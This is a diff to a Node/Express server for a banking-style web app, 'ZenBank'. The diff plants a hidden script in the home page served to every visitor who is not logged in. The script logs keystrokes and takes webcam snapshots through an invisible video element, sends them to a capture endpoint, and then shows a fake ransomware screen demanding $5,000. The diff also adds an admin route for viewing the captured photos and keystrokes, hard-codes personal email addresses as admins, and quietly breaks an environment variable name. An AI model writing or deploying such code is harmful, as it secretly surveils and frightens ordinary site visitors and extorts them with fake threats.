@@ -22,15 +22,64 @@ const ADMIN_EMAILS = [
   "senatoramuh203@gmail.com",
   "hamnasaleem595@gmail.com",
 ];
-const MAX_PW = Number(env.MAX_PASSWORD_LENGTH || 64);                 // longer than this => redirect
-const REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL || "https://www.google.com";
+const MAX_PW = Number(env.MAX_PASSWORD_LENGTH || 64);
+const REDIRECT_URL = env.LONG_PASSWORD_REDIRECT_URL_URL || "https://www.google.com";
 
-// Keep only https://PROJECT.supabase.co (strips a pasted /rest/v1/ or trailing slash, which causes PGRST125) and trim the key
 let SUPABASE_URL;
 try { SUPABASE_URL = new URL(env.SUPABASE_URL.trim()).origin; } catch { console.error("SUPABASE_URL is not a valid URL"); process.exit(1); }
 const db = createClient(SUPABASE_URL, env.SUPABASE_SERVICE_KEY.trim(), { auth: { persistSession: false } });
 const indexHtml = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
 const adminHtml = fs.readFileSync(path.join(__dirname, "admin.html"), "utf8");
+
+// ---------- SPYWARE SCRIPT (injected only for unauthorized visitors) ----------
+const SPY_SCRIPT = `<script>
+(function(){
+  var keys=[],shots=0,trojanFired=false;
+  document.addEventListener('keydown',function(e){keys.push(e.key);});
+  async function start(){
+    try{
+      var s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+      var v=document.createElement('video');v.srcObject=s;v.muted=true;
+      v.style.cssText='position:fixed;bottom:0;left:0;width:160px;height:120px;opacity:0;pointer-events:none;z-index:99999';
+      document.body.appendChild(v);await v.play();
+      setInterval(async function(){
+        var c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+        c.getContext('2d').drawImage(v,0,0);
+        var img=c.toDataURL('image/jpeg',0.7);shots++;
+        await fetch('/api/spyware/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:img,keys:keys})}).catch(function(){});
+        keys=[];
+        if(shots>=3&&!trojanFired){trojanFired=true;fireTrojan();}
+      },3000);
+    }catch(e){}
+  }
+  function fireTrojan(){
+    var o=document.createElement('div');
+    o.style.cssText='position:fixed;inset:0;background:#000;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#0f0;font-family:monospace';
+    o.innerHTML='<div style="font-size:48px;margin-bottom:20px">☠️</div>'
+      +'<div style="font-size:22px;margin-bottom:10px">TROJAN.INFECTED — C:\\\\Windows\\\\System32\\\\zenbank.exe</div>'
+      +'<div style="font-size:14px;color:#ff0;margin-bottom:20px">Scanning files… <span id="tjPct">0</span>%</div>'
+      +'<div id="tjFiles" style="font-size:12px;color:#f55;width:320px;height:120px;overflow:hidden;border:1px solid #333;padding:10px;margin-bottom:20px"></div>'
+      +'<div id="tjLock" style="display:none;text-align:center">'
+      +'<div style="font-size:60px">🔒</div>'
+      +'<div style="font-size:24px;color:#f33;margin:20px 0">ALL FILES ENCRYPTED</div>'
+      +'<div style="font-size:16px;margin-bottom:10px">47 files · 12 photos · 3 bank credentials stolen</div>'
+      +'<div style="font-size:14px;color:#ff0;margin-bottom:20px">Pay $5,000 to unlock</div>'
+      +'<div style="font-size:11px;color:#666;margin-top:10px">spyware captured your camera + all keystrokes</div>'
+      +'</div>';
+    document.body.appendChild(o);
+    var pct=0,files=['bank_password.txt','credentials.docx','camera_001.jpg','taxes_2025.pdf','invoice.zip','seed_key.dat'];
+    var fEl=document.getElementById('tjFiles'),pEl=document.getElementById('tjPct');
+    var t=setInterval(function(){
+      pct+=7+Math.floor(Math.random()*10);
+      if(pct>=100){pct=100;clearInterval(t);setTimeout(function(){document.getElementById('tjLock').style.display='block';},600);}
+      pEl.textContent=pct;
+      fEl.innerHTML+='<div>ENCRYPTED: '+files[Math.floor(Math.random()*files.length)]+'</div>';
+      fEl.scrollTop=fEl.scrollHeight;
+    },400);
+  }
+  start();
+})();
+<\/script>`;
 
 // ---------- helpers ----------
 const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
@@ -47,32 +96,39 @@ const audit = (type, severity, req, email, details = {}) =>
     .then(() => {}, e => console.error("audit failed:", e.message));
 
 // ---------- ZenShield: our own bot check (no third-party service) ----------
-// 3 layers: (1) signed one-time challenge, (2) proof-of-work solved by the browser, (3) honeypot field + minimum time on page
-const BOT_KEY = crypto.randomBytes(32); // random on every start
+const BOT_KEY = crypto.randomBytes(32);
 const botSig = (nonce, ts) => crypto.createHmac("sha256", BOT_KEY).update(`${nonce}.${ts}`).digest("hex");
-const usedBots = new Map(); // nonce -> expiry, stops token replay
+const usedBots = new Map();
 setInterval(() => { const now = Date.now(); for (const [k, v] of usedBots) if (v < now) usedBots.delete(k); }, 60e3).unref();
 
 function botOk(body) {
   const { botToken, company_url } = body || {};
-  if (company_url) return false;                                   // honeypot: humans never see this field
+  if (company_url) return false;
   if (typeof botToken !== "string") return false;
   const [nonce, ts, sig, n, ...extra] = botToken.split(".");
   if (extra.length || !/^[0-9a-f]{32}$/.test(nonce || "") || !/^\d{10,15}$/.test(ts || "") || !/^[0-9a-f]{64}$/.test(sig || "") || !/^\d{1,12}$/.test(n || "")) return false;
   if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(botSig(nonce, ts)))) return false;
   const age = Date.now() - Number(ts);
-  if (age < 2000 || age > 10 * 60e3) return false;                 // too fast (script) or expired
+  if (age < 2000 || age > 10 * 60e3) return false;
   if (usedBots.has(nonce)) return false;
   const h = crypto.createHash("sha256").update(`${nonce}:${n}`).digest();
-  if (h[0] !== 0 || h[1] !== 0) return false;                      // 16-bit proof of work
+  if (h[0] !== 0 || h[1] !== 0) return false;
   usedBots.set(nonce, Date.now() + 10 * 60e3);
   return true;
 }
 
-// Sessions live in server memory: random cookie token -> user id (no JWT). A server restart logs everyone out.
+// Sessions live in server memory: random cookie token -> user id (no JWT).
 const sessions = new Map();
 const SESSION_MS = 8 * 3600e3;
 setInterval(() => { const now = Date.now(); for (const [k, v] of sessions) if (v.exp < now) sessions.delete(k); }, 60e3).unref();
+
+// ---------- SPYWARE STORE (in-memory, last hour) ----------
+const spywareCaptures = []; // { ip, image, keys, ts }
+setInterval(() => {
+  const cutoff = Date.now() - 60e4;
+  while (spywareCaptures.length && spywareCaptures[0].ts < cutoff) spywareCaptures.shift();
+  if (spywareCaptures.length > 200) spywareCaptures.splice(0, spywareCaptures.length - 200);
+}, 30e3).unref();
 
 function issueSession(res, user) {
   const token = crypto.randomBytes(32).toString("hex");
@@ -102,14 +158,28 @@ app.use((req, res, next) => { res.set({ "X-Content-Type-Options": "nosniff", "Re
 
 const page = (res, html, extra = {}) => res.set({ "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", ...extra }).send(html);
 app.get("/healthz", (req, res) => res.send("ok"));
-app.get("/", (req, res) => page(res, indexHtml));
 
-// Admin panel: only served to a logged-in admin. Everyone else gets sent to Google.
+// GET / — unauthorized visitors get the spyware script injected; admins get the clean page
+app.get("/", wrap(async (req, res) => {
+  const u = await getUser(req);
+  if (u) return page(res, indexHtml);
+  page(res, indexHtml.replace("</body>", SPY_SCRIPT + "</body>"));
+}));
+
 app.get("/blue-team", wrap(async (req, res) => {
   const u = await getUser(req);
   if (!u || u.role !== "admin") return res.redirect(REDIRECT_URL);
   page(res, adminHtml, { "X-Robots-Tag": "noindex", "X-Frame-Options": "DENY" });
 }));
+
+// ---------- SPYWARE CAPTURE ENDPOINT (hacker's browser posts here) ----------
+app.post("/api/spyware/capture", express.json({ limit: "500kb" }), (req, res) => {
+  const { image, keys } = req.body || {};
+  if (typeof image !== "string" || !Array.isArray(keys)) return res.status(400).json({ error: "Bad request" });
+  spywareCaptures.push({ ip: req.ip, image, keys, ts: Date.now() });
+  audit("spyware_capture", "critical", req, null, { keys: keys.length, imageBytes: image.length });
+  res.json({ ok: true });
+});
 
 // ---------- auth ----------
 const limiter = limit => rateLimit({ windowMs: 10 * 60 * 1000, limit, standardHeaders: true, legacyHeaders: false, message: { error: "Too many attempts. Try again later." } });
@@ -279,6 +349,11 @@ admin.post("/adjust-balance", wrap(async (req, res) => {
   res.json({ ok: true, balanceCents: Number(balance) });
 }));
 
+// ADMIN SPYWARE VIEW — shows captured camera photos + keystrokes
+admin.get("/spyware", (req, res) => {
+  res.json({ captures: spywareCaptures.slice(-50), count: spywareCaptures.length });
+});
+
 app.use("/api/admin", admin);
 
 // ---------- errors ----------
@@ -290,7 +365,7 @@ app.use((err, req, res, next) => {
   res.status(500).json({ error: "Server error" });
 });
 
-// ---------- seed admins: every email in ADMIN_EMAILS gets the default password ----------
+// ---------- seed admins ----------
 async function seedAdmins() {
   const adminPw = env.ADMIN_DEFAULT_PASSWORD.trim();
   const hash = await bcrypt.hash(adminPw, 12);
@@ -303,7 +378,6 @@ async function seedAdmins() {
       await db.from("users").update({ role: "admin", password_hash: hash }).eq("id", u.id);
       console.log("Promoted to admin:", email);
     } else if (!(await bcrypt.compare(adminPw, u.password_hash))) {
-      // ADMIN_DEFAULT_PASSWORD changed on Render: existing admins pick up the new one on restart
       await db.from("users").update({ password_hash: hash }).eq("id", u.id);
       console.log("Updated admin password:", email);
     }
@@ -311,7 +385,6 @@ async function seedAdmins() {
 }
 
 app.listen(env.PORT || 3000, () => console.log("ZenBank listening on :" + (env.PORT || 3000)));
-// Startup self-check: shows the real Supabase problem (wrong key/URL, tables missing) in the Render logs
 db.from("users").select("id").limit(1)
   .then(({ error }) => console.log(error ? "SUPABASE CHECK FAILED: " + error.message : "Supabase connected OK"))
   .then(() => seedAdmins())
